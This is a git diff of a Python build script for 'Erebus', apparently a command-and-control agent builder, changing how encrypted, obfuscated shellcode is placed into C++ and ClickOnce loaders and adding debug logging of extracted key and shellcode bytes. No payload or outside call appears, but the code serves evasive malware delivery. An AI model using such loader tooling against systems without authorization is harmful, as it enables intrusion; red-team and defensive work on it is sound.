@@ -130,7 +130,6 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "Shellcode Loader",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
             ]
         ),
 
@@ -857,11 +856,11 @@ generated if none have been entered.""",
 
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
-            encryption_shellcode_path_cpp = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
+            encryption_shellcode_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
-            encryption_shellcode_path_cpp = str(encryption_shellcode_path_cpp)
+            encryption_shellcode_path = str(encryption_shellcode_path)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -966,9 +965,12 @@ generated if none have been entered.""",
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
                 if self.get_parameter("2.4 Shellcode Format") == "C":
                     shutil.copy(src=str(obfuscated_shellcode_path),
-                                dst=str(encryption_shellcode_path_cpp))
+                                dst=str(encryption_shellcode_path))
                 elif self.get_parameter("2.4 Shellcode Format") == "CSharp":
-                    raise NotImplementedError
+                    # For CSharp format, copy to encryption_shellcode_path which will be read later
+                    shutil.copy(src=str(obfuscated_shellcode_path),
+                                dst=str(encryption_shellcode_path))
+                    output += f"[DEBUG] Copied CSharp shellcode to {encryption_shellcode_path}\n"
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
@@ -994,7 +996,7 @@ generated if none have been entered.""",
                     end   = shellcode_src.find("};", start) + 2
                     key_array = shellcode_src[start:end]
                     output += key_array
-                    with open(encryption_shellcode_path_cpp, "w") as file:
+                    with open(encryption_shellcode_path, "w") as file:
                         file.write(key_array)
 
                     response.status = BuildStatus.Success
@@ -1225,37 +1227,6 @@ generated if none have been entered.""",
                         ))
                         return response
 
-                    # Convert resource file to UTF16
-                    cmd = [
-                        "iconv",
-                        "-f",
-                        "UTF-16LE",
-                        "-t",
-                        "UTF-8",
-                        f"{shellcode_loader_path}/Erebus.Loader.rc",
-                    ]
-
-                    resource_file = subprocess.check_output(cmd, text=True)
-                    with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
-                        file.write(resource_file)
-
-                    cmd = [
-                        "mv",
-                        f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
-                        f"{shellcode_loader_path}/Erebus.Loader.rc",
-                    ]
-                    process = await asyncio.create_subprocess_exec(
-                        *cmd,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                    )
-                    stdout, stderr = await process.communicate()
-
-                    if stdout:
-                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
-                    if stderr:
-                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
-
                     # Compile Loader
                     cmd = [
                         "make",
@@ -1308,10 +1279,6 @@ generated if none have been entered.""",
                         return response
                     output = ""
                 elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
-                    # Copy obfuscated shellcode to ClickOnce Resources folder
-                    clickonce_resources_path = Path(clickonce_loader_path) / "Resources"
-                    shutil.copy(dst=str(clickonce_resources_path / "erebus.bin"), src=obfuscated_shellcode_path)
-
                     payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                     payload_path = str(payload_path)
 
@@ -1324,10 +1291,13 @@ generated if none have been entered.""",
                     try:
                         encryption_key_bytes = ""
                         encrypted_shellcode_bytes = ""
-                        if os.path.exists(encryption_shellcode_path_cpp):
+                        if os.path.exists(encryption_shellcode_path):
                             try:
-                                with open(encryption_shellcode_path_cpp, "r") as combined_file:
+                                with open(encryption_shellcode_path, "r") as combined_file:
                                     combined_content = combined_file.read()
+                                    output += f"[DEBUG] File read from: {encryption_shellcode_path}\n"
+                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
+                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                     import re
                                     
                                     # Extract key array bytes - handles both C++ and C# formats
@@ -1338,6 +1308,11 @@ generated if none have been entered.""",
                                         hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                         if hex_key:
                                             encryption_key_bytes = ", ".join(hex_key)
+                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes}\n"
+                                        else:
+                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
+                                    else:
+                                        output += "[DEBUG] Key array not found in file\n"
                                     
                                     # Extract shellcode array bytes - handles both C++ and C# formats
                                     # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
@@ -1347,9 +1322,16 @@ generated if none have been entered.""",
                                         hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                         if hex_shellcode:
                                             encrypted_shellcode_bytes = ", ".join(hex_shellcode)
+                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
+                                        else:
+                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
+                                    else:
+                                        output += "[DEBUG] Shellcode array not found in file\n"
                                     
                             except Exception as extract_error:
                                 output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
+                        else:
+                            output += f"[DEBUG] File does not exist: {encryption_shellcode_path}\n"
 
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         injection_config_data = {
